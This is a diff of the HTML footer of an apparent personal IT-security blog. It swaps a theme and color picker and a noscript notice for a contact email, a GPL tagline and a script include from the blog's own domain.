+          <i class="far fa-envelope"></i> <a href="mailto:midnight.reverser@outlook.com">midnight.reverser@outlook.com</a> </div>
       
       
-    
-    
-    <p>Midnight Hackings - Yet another small blog about IT Sec</p>
-
-  
+  </div>
 
 
+<p class="copyright meta">GPL is life, contribute to copyleft projects!</p>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="req-js">
-  <button class="outline-dashed" title="Change to light/dark mode."><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><use xlink:href="/img/bundle.min.81064d3059ecbc81ba05123e6096d08d.svg#adjust"/></svg></button><input class="outline-dashed" type="color" list="presets" value="#1dbc91" title="Change accent color." aria-label="Change accent color."><datalist id="presets"><option value="#1f676b"><option value="#1dbc91"><option value="#225670"><option value="#dd587c"><option value="#902b37"><option value="#f3a530"><option value="#754e85"><option value="#7fc121"><option value="#a8314a"><option value="#ff7433"><option value="#3e6728"><option value="#c063bd"><option value="#805080"><option value="#9d629d"><option value="#a064a0"><option value="#7daa50"><option value="#284531"><option value="#285790"><option value="#F5A83D"><option value="#88aa33"><option value="#015660"><option value="#bf274e"><option value="#bf4242"><option value="#51b37c"></datalist>
 </div>
-
-
-
-  <noscript>
-    <p class="noscript">Unable to execute JavaScript. Some features were disabled.</p>
-  </noscript>
-
-
-
-    </footer>
-    
-    
-    
-
-    
-    
-
-  </body>
+</footer></main>
+    </body>
+    <script src=https://blog.midnighthackings.com/js/navbutton.js></script>
 </html>
